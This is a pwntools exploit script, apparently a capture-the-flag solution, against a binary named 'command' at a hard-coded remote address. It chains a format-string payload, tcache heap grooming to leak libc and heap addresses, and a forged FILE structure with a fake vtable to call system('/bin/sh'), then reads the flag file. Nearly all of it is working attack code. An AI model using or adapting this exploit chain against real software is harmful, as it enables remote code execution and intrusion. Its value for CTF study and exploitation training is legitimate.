#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'

if args.REMOTE:
    p = remote('200.136.213.77', 3337)
    libc = ELF('libc.so.6')
else:
    elf = ELF('command')
    libc = elf.libc

    env = {'LD_PRELOAD': 'libc.so.6'}
    p = process(elf.path, env=env)

    if args.GDB:
        gdb.attach(p, '''
            brva 0x150d
            brva 0x135a
            continue
            ''')

def choose(choice):
    p.sendlineafter(b'> ', choice)

def add(priority, command):
    choose(b'1')
    p.sendlineafter(b': ', str(priority).encode())
    p.sendafter(b': ', command)

def review(index):
    choose(b'2')
    p.sendlineafter(b': ', str(index).encode())

def delete(index):
    choose(b'3')
    p.sendlineafter(b': ', str(index).encode())

def list():
    choose(b'4')

def send_commands():
    choose(b'5')

def send_name(name):
    p.sendlineafter(b': ', name)

def send_rbs_id(index):
    p.sendlineafter(b'?\n', str(index).encode())

# 1. Send username
# It performs format string attack later

remain = 4
first = 0x0//8
second = 0x18//8

username = f'%*{second+remain}$c%{first+remain}$hn'.encode()

send_name(username)

# 2. Leak the libc address and heap address

delta = 0x3ebc20

## Fill the tcache bin

for _ in range(10):
    add(10, b'a' * 20)

for idx in range(9, 2, -1):
    delete(idx)

delete(0)
delete(2)

for _ in range(7):
    add(20, b'b' * 20)

## Leak libc address

add(30, b' ')

review(8)
p.recvuntil(b'Command: ')
leak = u64(p.recvline(6).rstrip().ljust(8, b'\x00'))
libc.address = leak - delta

log.info(f'leak = {hex(leak)}')
log.info(f'libc @ {hex(libc.address)}')

## Leak heap address

add(30, b'\x80')
review(9)
p.recvuntil(b'Command: ')
chunk = u64(p.recvline(6).rstrip().ljust(8, b'\x00'))

log.info(f'chunk @ {hex(chunk)}')

# 3. Calculate our targets based on the leaked address

rip = libc.symbols.system
rdi = libc.search(b'/bin/sh').__next__()

log.info(f'system @ {hex(rip)}')
log.info(f'/bin/sh @ {hex(rdi)}')

## We can only have even rdi
assert(rdi%2 == 0)

# 4. Craft the FILE structure

## This stores the address of a pointer to the _IO_str_overflow function

io_str_overflow_ptr_addr = libc.symbols._IO_file_jumps + 0xd8

## Calculate the vtable by subtracting appropriate offset

fake_vtable_addr = io_str_overflow_ptr_addr - 2*8

## lock points to __malloc_hook which is NULL

lock = libc.sym.__malloc_hook

## Craft file struct

file_str = FileStructure(null = lock)
file_str._IO_buf_base = 0
file_str._IO_buf_end = (rdi-100)//2
file_str._IO_write_ptr = (rdi-100)//2
file_str._IO_write_base = 0
file_str.vtable = fake_vtable_addr

file_struct = bytes(file_str)
## Next entry corresponds to: (*((_IO_strfile *) fp)->_s._allocate_buffer)
file_struct += p64(rip)

# 5. Write fake FILE structure in memory

delete(8)
add(0, file_struct[8:])

# 6. Exploit format string to set the file structure pointer to our fake structure

send_commands()

rbs_id = chunk & 0xffff

send_rbs_id(rbs_id)

p.recvline()

# 7-0. Get the shell

# p.interactive()

# 7-1. Get the flag

p.sendline(b'cat /home/commander/flag.txt')
flag = p.recvuntil(b'}').decode()

log.success(f'The flag is: {flag}')
